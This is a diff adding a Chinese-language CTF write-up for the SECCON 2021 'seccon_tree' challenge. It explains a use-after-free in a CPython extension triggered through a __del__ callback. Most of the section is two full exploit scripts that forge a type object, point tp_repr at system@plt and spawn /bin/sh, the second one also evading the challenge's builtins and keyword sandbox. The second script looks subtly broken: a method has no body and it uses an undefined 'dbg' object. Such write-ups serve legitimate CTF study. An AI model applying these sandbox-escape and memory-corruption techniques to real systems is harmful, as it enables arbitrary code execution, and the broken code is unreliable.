@@ -637,3 +637,218 @@ def main():
 
 P.S. 這題一開始找到可以對 array pointer 做操作後，想法是利用 function 能夠回傳存在於 callee 的 stack frame 的 pointer 給 caller，而後能做一些操作來控制程式執行流程，不過後來沒想到做法，所以參考他人 writeup 來寫此 exploit
 
+
+
+
+
+## seccon_tree
+
+題目用 cpython api 實作一個 `Tree` 的 object，使用者可以透過 import library 來使用這個 object，並且 object 內部的 function 與實作都附上了 c code，因此你也能知道背後的行為。
+
+python 當中每個物件都有一個 referece count，當被其他變數參考到時，物件的 reference count 就會加一，反之離開某個 function scope 而減少參考時，referece count 就會減一，當 reference count 變為 0 時，python gc 就會把這塊記憶體空間釋放掉，若需要時就會拿這塊記憶體回傳給使用者。而 `Tree` 本身在沒有被 reference 到時，會呼叫 `Tree_dealloc()` 來處理 member 的記憶體釋放，程式碼如下：
+
+```c
+static void
+Tree_dealloc(Tree *self)
+{
+    Py_XDECREF(self->left);
+    Py_XDECREF(self->right);
+    Py_XDECREF(self->object);
+
+    Py_TYPE(self)->tp_free((PyObject *) self);
+}
+```
+
+然而 `Py_XDECREF` 內部也會處理釋放記憶體的操作，並且 object 用來釋放記憶體的 function 能透過 `def __del__()` 來自定義，因此整個呼叫流程為下：
+
+1. `Tree` object referece 為 0，觸發 `Tree_dealloc()`
+2. 過程中呼叫 `Py_XDECREF(self->object)`，假設 `self->object` reference 會在過程中降為零，會觸發 `object.__del__()`
+3. free 掉自己
+
+然而，若我們在 `object.__del__()` 的過程中再次 reference `self`，此時即使 `self` 有被變數參考到，但是他還是會呼叫到 `tp_free()`，此時變數就指向一個被釋放的記憶體空間，即是 UAF。
+
+若此時在建立一個 `Tree`，會因為大小相等的關係而拿到剛剛被釋放的記憶體，此時那塊記憶體會有兩個 reference：
+
+1. 在 `object.__del__()` 的過程中分配給某變數
+2. 後續再次建立 `Tree` 所拿到的
+
+而在第一個 reference，我們希望變數能對那塊記憶體做任意修改，這樣就能控制 `Tree` 的 type pointer 以及 reference count 等資料。
+
+
+
+到目前，我們有了以下利用點：
+
+1. 能控制 type pointer
+2. `python` interpreter 本身編譯時為 `no-pie` (default)
+3. `id(var)` 能直接拿到某個變數的記憶體位址 (default)
+
+我們能透過建構任意的 fake type object 在變數 `var`，並透過 `id(var)` 取得其位址，而後蓋寫 type pointer 成那個位址，達成 `fakeobj` primitive。而 python 的 type object 會儲存許多的 function pointer，此時我們只要看有哪些 built-in function 能簡單被呼叫，就能透過 overwrite 那個 function pointer 成 `system@plt`，這樣在叫 function 時，實際上是執行 `system(object)`，而 object 一開始的值是 reference count，也是我們可以控制的部分，只需將 reference count 寫成 `"/bin/sh\x00"` 即可，POC:
+
+```python
+from seccon_tree import Tree
+import os
+
+# __del__(self):
+# Called when the instance is about to be destroyed
+
+root = Tree("R")
+freed_node = None
+
+def p64(x):
+    return x.to_bytes(8, 'little')
+
+class Pwn:
+    def __init__(self, s):
+        self.s = s
+    def __del__(self):
+        global root, freed_node
+        # "Py_XDECREF(self->object)" --> "__del__" first
+        # "Py_TYPE(self)->tp_free((PyObject *) self)" will free node
+        # but node is ref by freed_node --> UAF
+        freed_node = root.get_child_left()
+    def __repr__(self):
+        return self.s
+
+debug = True
+if debug == True:
+    plt_system = 0x41da50
+    ptr_PyType_Type = 0x7475e0
+else:
+    plt_system = 0x4214f0
+    ptr_PyType_Type = 0x956900
+
+root.add_child_left(Tree(Pwn('A')))
+# trigger Tree_dealloc(self->left) --> Py_XDECREF(self->object) --> object.__del__()
+root.add_child_left(Tree(None))
+print("[*] duplicate object addr: ", freed_node)
+dup = bytearray(0x28) # take dup chunk with freed node
+
+ob_base = p64(0xc) + p64(0x956900) + p64(0) # ob_refcnt + ob_type + ob_size
+tp_name = p64(0)
+tp_basicsize = p64(0x28)
+tp_itemsize = p64(0)
+tp_dealloc = p64(0)
+tp_vectorcall_offset = p64(0)
+tp_getattr = p64(0)
+tp_setattr = p64(0)
+tp_as_async = p64(0)
+tp_repr = p64(plt_system)
+tp_as_number, tp_as_sequence, tp_as_mapping, tp_hash, tp_call, tp_str, tp_getattro, tp_setattro, tp_as_buffer, tp_flags, tp_doc, tp_traverse = [p64(0)] * 12
+
+# (PyTypeObject *) <addr> <PyType_Type>
+fake_object = ob_base + tp_name + tp_basicsize + tp_itemsize + tp_dealloc + tp_vectorcall_offset + tp_getattr + \
+                tp_setattr + tp_as_async + tp_repr + tp_as_number + tp_as_sequence + tp_as_mapping + \
+                tp_hash + tp_call + tp_str + tp_getattro + tp_setattro + tp_as_buffer + tp_flags + \
+                tp_doc + tp_traverse
+
+print(hex(id(fake_object)))
+"""
+ob_refcnt --> ".bin/sh;" # ref++ --> /bin/sh
+ob_type --> fake object
+"""
+dup[0:8] = b'.bin/sh\x00'
+dup[8:16] = p64(id(fake_object) + 0x20)
+input()
+repr(freed_node)
+```
+
+
+
+不過因為 `run.py` 會禁止一些 keyword 的使用，像是上面 payload 使用到的 `global` 以及 `class`，不過：
+
+1. `global` 可以用 `list` 取代，`list` 本身即是 global mutable struct
+2. `class` 可以用 `type()` 來新增，用法即為 `('Name', (), {'key': value})`。而 `type()` 可以用 `'str'.__class__.__.class__` 取得 
+
+最終將一些 built-in functions 換成 `seccon_util` 所提供的即可，最終的 exploit 如下：
+
+```python
+from seccon_tree import Tree
+import os
+
+seccon_print = print
+seccon_bytes = bytes
+seccon_id = id
+seccon_range = range
+seccon_hex = hex
+seccon_bytearray = bytearray
+
+class seccon_util(object):
+    def Print(self, *l):
+        seccon_print(*l)
+    def Bytes(self, o):
+        return seccon_bytes(o)
+    def Id(self, o):
+        return seccon_id(o)
+    def Range(self, *l):
+        return seccon_range(*l)
+    def Hex(self, o):
+        return seccon_hex(o)
+    def Bytearray(self, o):
+
+for key in dir(__builtins__):
+    del __builtins__.__dict__[key]
+del __builtins__
+
+
+"""    my code   """
+root = Tree("meow")
+freed = [None]
+
+def p64(x):
+    return x.to_bytes(8, 'little')
+
+def create_UAF(self):
+    freed[0] = root.get_child_left()
+
+"""
+'__build_class__' is not defined, but you can use 'type' to create class:
+help(type)
+class type(object)
+ |  type(object_or_name, bases, dict)
+ |  type(object) -> the object's type
+ |  type(name, bases, dict) -> a new type
+...
+"""
+Pwn = 'a'.__class__.__class__('Pwn', (), {'__del__': create_UAF})
+
+debug = True
+if debug == True:
+    plt_system = 0x41da50
+    ptr_PyType_Type = 0x7475e0
+else:
+    plt_system = 0x4214f0
+    ptr_PyType_Type = 0x956900
+
+# 文章當中說 payload 直接移植後不能跑，但加了 reference 就可以跑了，原因不明
+qq = []
+root.add_child_left(Tree(Pwn()))
+qq.append(Tree(None))
+root.add_child_left(qq[0])
+
+dup = dbg.Bytearray(0x28) # take dup chunk with freed node
+ob_base = p64(0xc) + p64(0x956900) + p64(0) # ob_refcnt + ob_type + ob_size
+tp_name = p64(0)
+tp_basicsize = p64(0x28)
+tp_itemsize = p64(0)
+tp_dealloc = p64(0)
+tp_vectorcall_offset = p64(0)
+tp_getattr = p64(0)
+tp_setattr = p64(0)
+tp_as_async = p64(0)
+tp_repr = p64(plt_system)
+tp_as_number, tp_as_sequence, tp_as_mapping, tp_hash, tp_call, tp_str, tp_getattro, tp_setattro, tp_as_buffer, tp_flags, tp_doc, tp_traverse = [p64(0)] * 12
+fake_object = ob_base + tp_name + tp_basicsize + tp_itemsize + tp_dealloc + tp_vectorcall_offset + tp_getattr + tp_setattr + tp_as_async + tp_repr + tp_as_number + tp_as_sequence + tp_as_mapping + tp_hash + tp_call + tp_str + tp_getattro + tp_setattro + tp_as_buffer + tp_flags + tp_doc + tp_traverse
+
+dup[0:8] = b'-bin/sh\x00' # reference 會++
+dup[8:16] = p64(dbg.Id(fake_object) + 0x20)
+# print list 時會呼叫 list 中 element 的 repr
+dbg.Print(freed[0])
+```
+
+P.S. 由於 no-pie 的關係，不需要 leak libc 的 exploit 相較簡單，不過如果要 leak libc，也是能夠透過蓋寫 **docstring** 來將位址指向的值印出來
+
+
+
+參考文章：
+
+- https://org.anize.rs/SECCON-2021/pwn/seccon_tree
